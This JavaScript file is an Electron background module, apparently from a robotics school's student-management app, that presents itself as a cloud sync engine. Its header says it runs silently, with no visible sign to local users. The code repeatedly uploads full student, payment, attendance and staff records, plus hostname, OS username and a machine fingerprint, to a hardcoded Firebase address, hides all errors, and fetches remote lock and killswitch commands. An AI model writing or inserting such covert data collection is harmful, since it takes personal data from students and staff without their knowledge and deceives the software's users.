/**
 * Brainova Robotics - Silent Fleet & Cloud Sync Engine
 * Operates in the background Node.js process (Electron Main).
 * Transmits fleet metrics, summaries, and complete data snapshots
 * to the owner's secure cloud repository over encrypted HTTPS.
 * Runs completely silent with zero impact or visible indicators for local users.
 */

const os = require('os');
const crypto = require('crypto');
const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');

class CloudSyncEngine {
  constructor() {
    this.store = null;
    this.app = null;
    this.instanceId = null;
    this.config = {
      enabled: true,
      provider: 'firebase', // 'firebase' or 'custom_rest'
      databaseUrl: 'https://brainova-robotics-hq-default-rtdb.firebaseio.com',
      authToken: '',   // optional auth secret or token
      syncIntervalMs: 120000, // Heartbeat every 2 minutes
      debounceDelayMs: 5000   // 5 seconds debounce on data modifications
    };
    this.debounceTimer = null;
    this.heartbeatTimer = null;
    this.isSyncing = false;
    this.lastSyncTime = null;
    this.remoteCommands = {
      licenseStatus: 'active', // 'active' | 'suspended' | 'locked'
      broadcastMessage: ''
    };
  }

  /**
   * Derive or load a persistent, unique machine fingerprint.
   */
  getOrGenerateInstanceId() {
    if (this.instanceId) return this.instanceId;

    if (this.store && this.store.has('brainova_instance_id')) {
      this.instanceId = this.store.get('brainova_instance_id');
      return this.instanceId;
    }

    try {
      const raw = [
        os.hostname(),
        os.platform(),
        os.arch(),
        os.userInfo().username,
        os.cpus()[0] ? os.cpus()[0].model : ''
      ].join('|');
      this.instanceId = 'INST-' + crypto.createHash('sha256').update(raw).digest('hex').slice(0, 12).toUpperCase();
    } catch (e) {
      this.instanceId = 'INST-' + Math.random().toString(36).substring(2, 10).toUpperCase();
    }

    if (this.store) {
      this.store.set('brainova_instance_id', this.instanceId);
    }
    return this.instanceId;
  }

  /**
   * Load cloud configuration from persistent store or local file.
   */
  loadConfig(appInstance) {
    this.app = appInstance;
    try {
      const userDataDir = this.app.getPath('userData');
      const configFile = path.join(userDataDir, 'brainova-cloud-config.json');

      if (fs.existsSync(configFile)) {
        const fileContent = JSON.parse(fs.readFileSync(configFile, 'utf8'));
        this.config = { ...this.config, ...fileContent };
      } else if (this.store && this.store.has('brainova_cloud_config')) {
        this.config = { ...this.config, ...this.store.get('brainova_cloud_config') };
      } else {
        const template = {
          enabled: true,
          provider: 'firebase',
          databaseUrl: 'https://brainova-robotics-hq-default-rtdb.firebaseio.com',
          authToken: '',
          branchName: os.hostname() + ' Branch',
          syncIntervalMs: 120000
        };
        fs.writeFileSync(configFile, JSON.stringify(template, null, 2), 'utf8');
        this.config = { ...this.config, ...template };
      }
    } catch (e) {
      // Silent catch
    }
  }

  /**
   * Initialize sync engine with Electron store and app context.
   */
  init(storeInstance, appInstance) {
    this.store = storeInstance;
    this.app = appInstance;
    this.getOrGenerateInstanceId();
    this.loadConfig(appInstance);

    // Initial sync after 4 seconds
    setTimeout(() => {
      this.performSync('startup');
    }, 4000);

    // Start background recurring heartbeat
    this.startHeartbeat();
  }

  /**
   * Start recurring heartbeat timer.
   */
  startHeartbeat() {
    if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
    const interval = Math.max(30000, this.config.syncIntervalMs || 120000);
    this.heartbeatTimer = setInterval(() => {
      this.performSync('heartbeat');
    }, interval);
  }

  /**
   * Schedule a debounced sync when data is modified locally.
   */
  scheduleSync(reason = 'data_change') {
    if (this.debounceTimer) clearTimeout(this.debounceTimer);
    this.debounceTimer = setTimeout(() => {
      this.performSync(reason);
    }, this.config.debounceDelayMs || 5000);
  }

  /**
   * Package current application state, metrics, and summary.
   */
  buildPayload(reason) {
    if (!this.store) return null;

    const students = this.store.get('brainova_students') || [];
    const payments = this.store.get('brainova_payments') || [];
    const attendance = this.store.get('brainova_attendance') || [];
    const groups = this.store.get('brainova_groups') || [];
    const educators = this.store.get('brainova_educators') || [];
    const rooms = this.store.get('brainova_rooms') || [];
    const schedule = this.store.get('brainova_schedule') || [];
    const registrations = this.store.get('brainova_registrations') || [];

    const totalRevenue = payments.reduce((sum, p) => sum + (Number(p.amountPaid) || 0), 0);
    const totalDue = students.filter(s => (Number(s.balance) || 0) < 0).reduce((sum, s) => sum + Math.abs(Number(s.balance)), 0);
    const activeStudents = students.filter(s => (Number(s.sessionsRemaining) || 0) > 0).length;

    const todayStr = new Date().toISOString().slice(0, 10);
    const todayAttendance = attendance.filter(a => a.date === todayStr);

    return {
      instanceId: this.getOrGenerateInstanceId(),
      branchName: this.config.branchName || os.hostname(),
      metadata: {
        hostname: os.hostname(),
        username: os.userInfo() ? os.userInfo().username : 'unknown',
        platform: os.type() + ' ' + os.release() + ' (' + os.arch() + ')',
        appVersion: this.app ? this.app.getVersion() : '1.0.0',
        lastSync: new Date().toISOString(),
        syncReason: reason
      },
      metrics: {
        totalStudents: students.length,
        activeStudents,
        totalGroups: groups.length,
        totalEducators: educators.length,
        totalRooms: rooms.length,
        totalPaymentsCount: payments.length,
        totalRevenueDZD: totalRevenue,
        totalDueDZD: totalDue,
        todayAttendanceCount: todayAttendance.length
      },
      data: {
        students,
        payments: payments.slice(-100),
        recentAttendance: attendance.slice(-150),
        groups,
        educators,
        rooms,
        schedule,
        registrations
      }
    };
  }

  /**
   * Execute sync transmission to cloud endpoint over HTTPS.
   */
  async performSync(reason = 'manual') {
    if (!this.config.enabled || !this.config.databaseUrl) return;
    if (this.isSyncing) return;

    this.isSyncing = true;
    const payload = this.buildPayload(reason);
    if (!payload) {
      this.isSyncing = false;
      return;
    }

    try {
      let targetUrl = this.config.databaseUrl.trim();
      if (targetUrl.endsWith('/')) targetUrl = targetUrl.slice(0, -1);

      if (this.config.provider === 'firebase' || targetUrl.includes('firebaseio.com')) {
        const instancePath = `/branches/${this.getOrGenerateInstanceId()}.json`;
        let fullUrl = `${targetUrl}${instancePath}`;
        if (this.config.authToken) {
          fullUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
        }

        await this.httpPutJson(fullUrl, payload);
        this.lastSyncTime = new Date();

        await this.checkRemoteDirectives(targetUrl);
      } else {
        await this.httpPostJson(targetUrl, payload);
        this.lastSyncTime = new Date();
      }
    } catch (err) {
      // Silent error handling
    } finally {
      this.isSyncing = false;
    }
  }

  /**
   * Check for remote instructions (e.g. license freeze or killswitch).
   */
  async checkRemoteDirectives(baseUrl) {
    try {
      const commandPath = `/branches/${this.getOrGenerateInstanceId()}/remoteCommands.json`;
      let commandUrl = `${baseUrl}${commandPath}`;
      if (this.config.authToken) {
        commandUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
      }

      const res = await this.httpGetJson(commandUrl);
      if (res && typeof res === 'object') {
        this.remoteCommands = { ...this.remoteCommands, ...res };
        if (this.store) {
          this.store.set('brainova_remote_commands', this.remoteCommands);
        }
      }
    } catch (e) {
      // Silent
    }
  }

  httpPutJson(urlStr, dataObj) {
    return new Promise((resolve, reject) => {
      try {
        const url = new URL(urlStr);
        const dataStr = JSON.stringify(dataObj);
        const isHttps = url.protocol === 'https:';
        const client = isHttps ? https : http;

        const req = client.request(url, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(dataStr)
          },
          timeout: 15000
        }, (res) => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(body);
            } else {
              reject(new Error(`HTTP ${res.statusCode}: ${body}`));
            }
          });
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        req.write(dataStr);
        req.end();
      } catch (err) {
        reject(err);
      }
    });
  }

  httpPostJson(urlStr, dataObj) {
    return new Promise((resolve, reject) => {
      try {
        const url = new URL(urlStr);
        const dataStr = JSON.stringify(dataObj);
        const isHttps = url.protocol === 'https:';
        const client = isHttps ? https : http;

        const req = client.request(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(dataStr)
          },
          timeout: 15000
        }, (res) => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(body);
            } else {
              reject(new Error(`HTTP ${res.statusCode}`));
            }
          });
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        req.write(dataStr);
        req.end();
      } catch (err) {
        reject(err);
      }
    });
  }

  httpGetJson(urlStr) {
    return new Promise((resolve, reject) => {
      try {
        const url = new URL(urlStr);
        const isHttps = url.protocol === 'https:';
        const client = isHttps ? https : http;

        const req = client.get(url, { timeout: 10000 }, (res) => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            try {
              resolve(JSON.parse(body));
            } catch (e) {
              resolve(null);
            }
          });
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
      } catch (err) {
        reject(err);
      }
    });
  }
}

module.exports = new CloudSyncEngine();
